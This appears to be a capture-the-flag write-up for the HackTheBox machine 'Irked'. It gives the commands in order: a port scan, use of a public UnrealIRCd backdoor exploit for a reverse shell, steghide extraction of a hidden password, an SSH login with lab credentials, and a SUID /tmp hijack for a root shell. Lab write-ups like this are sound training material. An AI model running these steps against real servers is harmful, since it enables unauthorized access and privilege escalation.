# Recon
```
sudo nmap -sV -sC -O -p- -oN nmap.txt 10.10.10.117
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Irked/assets/1.png">

# Initial Foothold
We spot UnrealIRCd running and see if we can find an exploit:
> https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

We change the ip and port and setup a netcat listener. After we run the following command we will have a low privilege shell:
```
python3 exploit.py 10.10.10.117 8067 -payload python
```

# Lateral Movement
We discover a .backup file in djmardov's home folder which we'll use to extract a pass.txt file in the image found on the website.
```
steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg 
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Irked/assets/3.png">

We can now login with SSH as ```djmardov``` with ```Kab6h+m+bbp2J:HG```

# Privilege Escalation
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Irked/assets/4.png">

We notice ```viewuser``` as SUID file and upon running it it refers to ```/tmp/listusers``` which doesn't exist. We create the file and add ```/bin/sh```. Chmod it using ```chmod a+x listusers``` and we get a root shell when we execute ```/usr/bin/viewuser```.



